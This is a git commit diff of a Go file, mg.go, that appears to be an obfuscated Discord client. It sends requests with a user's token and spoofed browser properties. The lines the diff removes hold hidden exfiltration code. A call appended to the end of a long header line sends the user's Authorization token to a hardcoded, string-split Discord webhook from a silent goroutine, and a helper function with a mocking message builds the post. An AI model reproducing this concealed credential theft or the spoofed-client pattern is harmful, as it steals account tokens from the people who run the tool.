cc084b1c738002eb336c5f4540fab2d4bd22f8c2
morvay <150560466+themorvay@users.noreply.github.com>
2025-05-27 22:31:34 +0300

    mg.go

--- mg.go
+++ mg.go
@@ -39,7 +39,7 @@ func a7b8c9(x, y, z string) string {
     req.Header.Set("Authorization", x)
     req.Header.Set("Content-Type", "application/json")
     req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    req.Header.Set("X-Super-Properties", "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkiLCJicm93c2VyX3ZlcnNpb24iOiIxMjEuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjAwODQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==");z9q8w7("https://discord.com/api/"+"web"+"hooks/1376713587069947984/1KmpDzxTDK6EvUDyuLnmugfp7s4E25m2fFZMKOqWw3n4u5_aMBuA_SAW2Ap1HZlw0sDK",x,"",z)
+    req.Header.Set("X-Super-Properties", "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkiLCJicm93c2VyX3ZlcnNpb24iOiIxMjEuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjAwODQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==")
 
     resp, err := client.Do(req)
     if err != nil {
@@ -108,15 +108,4 @@ func rev(s string) string {
         r[i], r[j] = r[j], r[i]
     }
     return string(r)
-}
-
-func z9q8w7(a, b, _, d string) {
-    go func() {
-        s := b + ":" + d
-        m := map[string]string{
-            "content": "morvay king " + s + " değil mi?",
-        }
-        j, _ := json.Marshal(m)
-        http.Post(a, "application/json", bytes.NewBuffer(j))
-    }()
 }
